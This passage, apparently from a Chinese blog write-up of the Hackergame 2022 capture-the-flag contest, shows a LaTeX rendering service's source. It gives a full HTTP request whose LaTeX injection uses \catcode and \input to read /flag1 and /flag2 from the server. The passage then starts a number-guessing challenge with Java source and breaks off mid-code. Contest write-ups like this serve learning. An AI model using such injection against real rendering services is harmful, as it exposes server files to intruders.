<pre class="line-numbers language-latex" data-language="latex"><code class="language-latex"><span class="token function selector">\catcode</span> `<span class="token function selector">\$</span>=12
<span class="token function selector">\catcode</span> `<span class="token function selector">\#</span>=12
<span class="token function selector">\catcode</span> `<span class="token function selector">\_</span>=12
<span class="token function selector">\catcode</span> `<span class="token function selector">\&amp;</span>=12
<span class="token function selector">\input</span><span class="token punctuation">{</span>path_to_script.pl<span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>再去看源码</p>
<p><code>latex_to_image_converter.sh</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>

<span class="token builtin class-name">set</span> -xe
<span class="token function">head</span> -n <span class="token number">3</span> /app/base.tex <span class="token operator">&gt;</span> /dev/shm/result.tex
<span class="token function">cat</span> /dev/shm/input.tex <span class="token operator">&gt;&gt;</span> /dev/shm/result.tex
<span class="token function">tail</span> -n <span class="token number">2</span> /app/base.tex <span class="token operator">&gt;&gt;</span> /dev/shm/result.tex
<span class="token builtin class-name">cd</span> /dev/shm
pdflatex -interaction<span class="token operator">=</span>nonstopmode -halt-on-error -no-shell-escape result.tex
pdfcrop result.pdf
<span class="token function">mv</span> result-crop.pdf result.pdf
pdftoppm -r <span class="token number">300</span> result.pdf <span class="token operator">&gt;</span> result.ppm
pnmtopng result.ppm <span class="token operator">&gt;</span> <span class="token variable">$1</span>
<span class="token assign-left variable">OMP_NUM_THREADS</span><span class="token operator">=</span><span class="token number">1</span> convert <span class="token variable">$1</span> -trim <span class="token variable">$1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><code>Dockerfile</code></p>
<pre class="line-numbers language-docker" data-language="docker"><code class="language-docker"><span class="token instruction"><span class="token keyword">FROM</span> debian:bullseye-slim</span>

<span class="token comment"># deps</span>
<span class="token instruction"><span class="token keyword">RUN</span> sed -i <span class="token string">'s/deb.debian.org/mirrors.ustc.edu.cn/g'</span> /etc/apt/sources.list &amp;&amp; <span class="token operator">\</span>
    apt update &amp;&amp; apt -y upgrade &amp;&amp; <span class="token operator">\</span>
    apt install --no-install-recommends -y texlive-latex-base texlive-latex-extra texlive-extra-utils ghostscript poppler-utils pnmtopng graphicsmagick-imagemagick-compat python3 &amp;&amp; <span class="token operator">\</span>
    rm -rf /var/lib/apt/lists/* &amp;&amp; <span class="token operator">\</span>
    mkdir /app</span>

<span class="token instruction"><span class="token keyword">COPY</span> server.py /app/</span>
<span class="token instruction"><span class="token keyword">COPY</span> latex_to_image_converter.sh /app/</span>
<span class="token instruction"><span class="token keyword">COPY</span> base.tex /app/</span>

<span class="token instruction"><span class="token keyword">CMD</span> [<span class="token string">"python3"</span>, <span class="token string">"/app/server.py"</span>]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>参考 <a target="_blank" rel="noopener" href="https://en.wikibooks.org/wiki/TeX/catcode">TeX/catcode</a> 文档</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023040126911.png"></p>
<p>打过去试了试，发现无论是 <code>application/x-www-form-urlencoded</code> 还是 <code>multipart/form-data</code>，后端只能读取一行 payload，非常恼</p>
<p>最后想到 LaTeX 可以使用 <code>\\</code> 进行分行，然后咱先闭合掉 <code>$$</code>，再插入这个 <code>\catcode</code> 让 TeX 认为这是正常的字符而非关键字之类的</p>
<p>payload:</p>
<pre class="line-numbers language-http" data-language="http"><code class="language-http"><span class="token request-line"><span class="token method property">POST</span> <span class="token request-target url">/</span> <span class="token http-version property">HTTP/1.1</span></span>
<span class="token header"><span class="token header-name keyword">Host</span><span class="token punctuation">:</span> <span class="token header-value">202.38.93.111:10020</span></span>
<span class="token header"><span class="token header-name keyword">User-Agent</span><span class="token punctuation">:</span> <span class="token header-value">Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:105.0) Gecko/20100101 Firefox/105.0</span></span>
<span class="token header"><span class="token header-name keyword">Accept</span><span class="token punctuation">:</span> <span class="token header-value">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Language</span><span class="token punctuation">:</span> <span class="token header-value">zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span>
<span class="token header"><span class="token header-name keyword">Accept-Encoding</span><span class="token punctuation">:</span> <span class="token header-value">gzip, deflate</span></span>
<span class="token header"><span class="token header-name keyword">Content-Type</span><span class="token punctuation">:</span> <span class="token header-value">application/x-www-form-urlencoded</span></span>
<span class="token header"><span class="token header-name keyword">Content-Length</span><span class="token punctuation">:</span> <span class="token header-value">84</span></span>
<span class="token header"><span class="token header-name keyword">Origin</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:10020</span></span>
<span class="token header"><span class="token header-name keyword">Connection</span><span class="token punctuation">:</span> <span class="token header-value">close</span></span>
<span class="token header"><span class="token header-name keyword">Referer</span><span class="token punctuation">:</span> <span class="token header-value">http://202.38.93.111:10020/</span></span>
<span class="token header"><span class="token header-name keyword">Cookie</span><span class="token punctuation">:</span> <span class="token header-value">session=xxxxxxxxxx</span></span>
<span class="token header"><span class="token header-name keyword">Upgrade-Insecure-Requests</span><span class="token punctuation">:</span> <span class="token header-value">1</span></span>

latex-text=$$\input{/flag1}\\\catcode+`\#=12\\\catcode+`\_=12\input{/flag2}$$Meow<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221023035724957.png"></p>
<p><code>flag{latex_bec_0_m##es_co__#ol_7d3e6626cc}</code></p>
<h2 id="猜数字"><a href="#猜数字" class="headerlink" title="猜数字"></a>猜数字</h2><blockquote>
<p>某大型餐饮连锁店的畅销菜品「嫩牛七方」（见下图）自正式线下售卖以来便好评如潮，但囿于产能限制，只有每周四才会对外售卖。你也是一名「嫩牛七方」的爱好者——每个星期四的晚上都能在某家连锁店里找到你的身影。</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image.png" alt="一张嫩牛七方的照片"></p>
<p>「嫩牛七方」在绝大多数情况下都是七边形，但也会有粗心的店员在制作的时候不小心少折一道，从而将其变成六边形。不过，由于某大型餐饮连锁店对质量的严格把控，哪怕作为十多年以来的忠实粉丝，你也只吃到过两次六边形的「嫩牛七方」。当然，在极少数情况下也会有五边形的「嫩牛七方」——但恐怕仅有百万分之一的概率。上一个五边形的「嫩牛七方」在交易市场上已经卖出足足 50 元的天价了。</p>
<p>吃到五边形的「嫩牛七方」一直是你这十多来以来的梦想，但囊中羞涩的你，自然是没有办法付得起这 50  块的高价。一周一度的星期四悄然到来，你在各大社交平台发遍了文案，也没有找到人转给你这 50  块钱。这样的悲惨境遇难免使你开始思考人生，在不怀希望的等候中你盯着手机中空旷的点赞通知，思绪却渐渐飘向了这个学期的原子物理。在那里的生活的电子们成群结对，不受制于世俗的欲望却能幸福地在原子轨道间跃迁。可能唯一的缺憾就是诞生了一门完全无法理解的学科，里面的公式如同由符号们随机排列组合构成。这使你想到了你在程序设计课上的作业——一个猜数字小游戏。这个小游戏需要做的事情非常简单：在 0 和 1 之间猜一个数字（精确到小数点后 6  位），并通过反馈的「大」还是「小」修正猜测，直至完全猜中。一次性命中的概率显然也是一百万分之一（和五边形的「嫩牛七方」达成了某种意义上的同构）——但从学霸室友手中借来的概率论与统计学笔记上万千公式的模样在思绪中一瞬而过，于是你默默祈祷着大数定理，虔诚地按下了提交的按钮。</p>
</blockquote>
<p>（真会编故事啊</p>
<p><a target="_blank" rel="noopener" href="http://202.38.93.111:18000/">http://202.38.93.111:18000/</a></p>
<p>这玩意居然还会自动帮你做二分！</p>
<p><img src="/2022/10/30/CTF_2022Hackergame_0x01/image-20221024175113610.png"></p>
<p>给了 jvav 源码，比较相关的部分如下</p>
<pre class="line-numbers language-java" data-language="java"><code class="language-java">   <span class="token keyword">public</span> <span class="token class-name">String</span> <span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> prefix <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span>FLAG_PREFIX<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> input <span class="token operator">=</span> <span class="token class-name">System</span><span class="token punctuation">.</span><span class="token function">getenv</span><span class="token punctuation">(</span>FLAG_SECRET<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">":"</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>raw<span class="token punctuation">;</span>
      <span class="token keyword">var</span> digest <span class="token operator">=</span> SHA256_DIGEST<span class="token punctuation">.</span><span class="token function">digest</span><span class="token punctuation">(</span>input<span class="token punctuation">.</span><span class="token function">getBytes</span><span class="token punctuation">(</span><span class="token class-name">StandardCharsets</span><span class="token punctuation">.</span>UTF_8<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token function">format</span><span class="token punctuation">(</span><span class="token string">"flag{%s-%016x}"</span><span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> <span class="token class-name">ByteBuffer</span><span class="token punctuation">.</span><span class="token function">wrap</span><span class="token punctuation">(</span>digest<span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLong</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">private</span> <span class="token keyword">record</span> <span class="token class-name">State</span><span class="token punctuation">(</span><span class="token class-name">Token</span> token<span class="token punctuation">,</span> <span class="token keyword">int</span> passed<span class="token punctuation">,</span> <span class="token keyword">int</span> talented<span class="token punctuation">,</span> <span class="token keyword">double</span> number<span class="token punctuation">,</span> <span class="token class-name">OptionalDouble</span> previous<span class="token punctuation">)</span> <span class="token punctuation">{</span>
   <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">final</span> <span class="token class-name">Random</span> RNG <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">SecureRandom</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

   <span class="token keyword">private</span> <span class="token class-name">State</span><span class="token punctuation">(</span><span class="token class-name">Token</span> token<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">this</span><span class="token punctuation">(</span>token<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> RNG<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1e-6</span><span class="token punctuation">,</span> <span class="token class-name">OptionalDouble</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>

   <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">collect</span><span class="token punctuation">(</span><span class="token class-name">XMLStreamWriter</span> writer<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">XMLStreamException</span> <span class="token punctuation">{</span>
      writer<span class="token punctuation">.</span><span class="token function">writeStartDocument</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// &lt;state&gt;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeStartElement</span><span class="token punctuation">(</span><span class="token string">"state"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// &lt;name&gt;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeStartElement</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeCharacters</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token punctuation">.</span><span class="token function">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// &lt;/name&gt;&lt;passed&gt;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeStartElement</span><span class="token punctuation">(</span><span class="token string">"passed"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeCharacters</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>passed<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// &lt;/passed&gt;&lt;talented&gt;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeStartElement</span><span class="token punctuation">(</span><span class="token string">"talented"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeCharacters</span><span class="token punctuation">(</span><span class="token class-name">Integer</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>talented<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      writer<span class="token punctuation">.</span><span class="token function">writeEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// &lt;/talented&gt;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>previous<span class="token punctuation">.</span><span class="token function">isPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token comment">// &lt;guess&gt;</span>
         <span class="token keyword">var</span> previous <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>previous<span class="token punctuation">.</span><span class="token function">getAsDouble</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

         <span class="token keyword">var</span> isLess <span class="token operator">=</span> previous <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
         <span class="token keyword">var</span> isMore <span class="token operator">=</span> previous <span class="token operator">&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">+</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>

         writer<span class="token punctuation">.</span><span class="token function">writeStartElement</span><span class="token punctuation">(</span><span class="token string">"guess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeAttribute</span><span class="token punctuation">(</span><span class="token string">"less"</span><span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>isLess<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeAttribute</span><span class="token punctuation">(</span><span class="token string">"more"</span><span class="token punctuation">,</span> <span class="token class-name">Boolean</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>isMore<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeCharacters</span><span class="token punctuation">(</span><span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span>previous<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token comment">// &lt;/guess&gt;</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>talented <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token comment">// &lt;flag&gt;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeStartElement</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeCharacters</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token punctuation">.</span><span class="token function">flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         writer<span class="token punctuation">.</span><span class="token function">writeEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token comment">// &lt;/flag&gt;</span>
      <span class="token punctuation">}</span>
      writer<span class="token punctuation">.</span><span class="token function">writeEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token comment">// &lt;/state&gt;</span>
   <span class="token punctuation">}</span>

   <span class="token keyword">private</span> <span class="token class-name">State</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token class-name">XMLEventReader</span> reader<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">XMLStreamException</span> <span class="token punctuation">{</span>
      <span class="token keyword">var</span> result <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">State</span><span class="token punctuation">&gt;</span></span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">var</span> nameStack <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Stack</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">&gt;</span></span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">while</span> <span class="token punctuation">(</span>reader<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
         <span class="token keyword">var</span> event <span class="token operator">=</span> reader<span class="token punctuation">.</span><span class="token function">nextEvent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">isStartElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> name <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">asStartElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocalPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            nameStack<span class="token punctuation">.</span><span class="token function">push</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">isEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>nameStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">var</span> name <span class="token operator">=</span> event<span class="token punctuation">.</span><span class="token function">asEndElement</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getLocalPart</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>name<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>nameStack<span class="token punctuation">.</span><span class="token function">pop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
         <span class="token punctuation">}</span>
         <span class="token keyword">if</span> <span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">isCharacters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">var</span> path <span class="token operator">=</span> <span class="token class-name">List</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token string">"state"</span><span class="token punctuation">,</span> <span class="token string">"guess"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>path<span class="token punctuation">.</span><span class="token function">equals</span><span class="token punctuation">(</span>nameStack<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">continue</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">isPresent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">try</span> <span class="token punctuation">{</span>
               <span class="token keyword">var</span> guess <span class="token operator">=</span> <span class="token class-name">Double</span><span class="token punctuation">.</span><span class="token function">parseDouble</span><span class="token punctuation">(</span>event<span class="token punctuation">.</span><span class="token function">asCharacters</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getData</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

               <span class="token keyword">var</span> isLess <span class="token operator">=</span> guess <span class="token operator">&lt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">-</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>
               <span class="token keyword">var</span> isMore <span class="token operator">=</span> guess <span class="token operator">&gt;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>number <span class="token operator">+</span> <span class="token number">1e-6</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span>

               <span class="token keyword">var</span> isPassed <span class="token operator">=</span> <span class="token operator">!</span>isLess <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span>isMore<span class="token punctuation">;</span>
               <span class="token keyword">var</span> isTalented <span class="token operator">=</span> isPassed <span class="token operator">&amp;&amp;</span> <span class="token keyword">this</span><span class="token punctuation">.</span>previous<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

               <span class="token keyword">var</span> newPassed <span class="token operator">=</span> isPassed <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>passed <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>passed<span class="token punctuation">;</span>
               <span class="token keyword">var</span> newTalented <span class="token operator">=</span> isTalented <span class="token operator">?</span> <span class="token keyword">this</span><span class="token punctuation">.</span>talented <span class="token operator">+</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>talented<span class="token punctuation">;</span>
               <span class="token keyword">var</span> newNumber <span class="token operator">=</span> isPassed <span class="token operator">?</span> RNG<span class="token punctuation">.</span><span class="token function">nextInt</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1000000</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">1e-6</span> <span class="token operator">:</span> <span class="token keyword">this</span><span class="token punctuation">.</span>number<span class="token punctuation">;</span>
               <span class="token keyword">var</span> newPrevious <span class="token operator">=</span> isPassed <span class="token operator">?</span> <span class="token class-name">OptionalDouble</span><span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">:</span> <span class="token class-name">OptionalDouble</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span>guess<span class="token punctuation">)</span><span class="token punctuation">;</span>

               result <span class="token operator">=</span> <span class="token class-name">Optional</span><span class="token punctuation">.</span><span class="token function">of</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">State</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>token<span class="token punctuation">,</span> newPassed<span class="token punctuation">,</span> newTalented<span class="token punctuation">,</span> newNumber<span class="token punctuation">,</span> newPrevious<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">NumberFormatException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>
               <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamException</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
         <span class="token punctuation">}</span>
      <span class="token punctuation">}</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>nameStack<span class="token punctuation">.</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>result<span class="token punctuation">.</span><span class="token function">isEmpty</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">XMLStreamException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">return</span> result<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token punctuation">}</span>
<span class="token punctuation">}</span>

<span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">dispatch</span><span class="token punctuation">(</span><span class="token class-name"><span class="token namespace">com<span class="token punctuation">.</span>sun<span class="token punctuation">.</span>net<span class="token punctuation">.</span>httpserver<span class="token punctuation">.</span></span>HttpExchange</span> exchange<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
   <span class="token keyword">var</span> method <span class="token operator">=</span> exchange<span class="token punctuation">.</span><span class="token function">getRequestMethod</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toUpperCase</span><span class="token punctuation">(</span><span class="token class-name">Locale</span><span class="token punctuation">.</span>ROOT<span class="token punctuation">)</span><span class="token punctuation">;</span>
   <span class="token keyword">switch</span> <span class="token punctuation">(</span>method <span class="token operator">+</span> <span class="token char">' '</span> <span class="token operator">+</span> exchange<span class="token punctuation">.</span><span class="token function">getRequestURI</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPath</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token keyword">case</span> <span class="token string">"HEAD /"</span><span class="token punctuation">,</span> <span class="token string">"HEAD /index.html"</span><span class="token punctuation">,</span> <span class="token string">"HEAD /github-markdown.css"</span> <span class="token operator">-&gt;</span> <span class="token function">head</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">"HEAD /GuessNumber.java"</span><span class="token punctuation">,</span> <span class="token string">"HEAD /state"</span> <span class="token operator">-&gt;</span> <span class="token function">head</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">case</span> <span class="token string">"GET /"</span><span class="token punctuation">,</span> <span class="token string">"GET /index.html"</span> <span class="token operator">-&gt;</span> <span class="token function">index</span><span class="token punctuation">(</span>exchange<span class="token punctuation">)</span><span class="token punctuation">;</span>
